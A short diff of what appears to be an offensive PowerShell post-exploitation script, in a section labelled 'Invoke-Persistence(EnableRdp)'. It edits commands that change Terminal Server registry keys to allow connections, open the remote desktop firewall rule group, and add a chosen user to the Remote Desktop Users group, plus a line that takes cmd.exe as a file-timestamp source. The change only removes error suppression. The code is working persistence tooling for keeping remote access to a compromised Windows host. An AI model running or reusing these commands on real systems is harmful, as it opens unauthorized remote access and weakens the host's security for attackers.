@@ -207,10 +207,10 @@ $TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName
 			Try {
 				$h = "`n### Invoke-Persistence(EnableRdp) ###`n"
 				$h
-				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f 2> nul)
-				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f 2>nul)
-				(netsh advfirewall firewall set rule group="remote desktop" new enable=yes 2>nul)
-				(net localgroup "Remote Desktop Users" $RdpUser /add 2>nul)
+				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f)
+				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f)
+				(netsh advfirewall firewall set rule group="remote desktop" new enable=yes)
+				(net localgroup "Remote Desktop Users" $RdpUser /add)
 				Write " [+] Successfully enabled Remote Desktop and added $RdpUser to the Remote Desktop users group."
 				$h
 			}
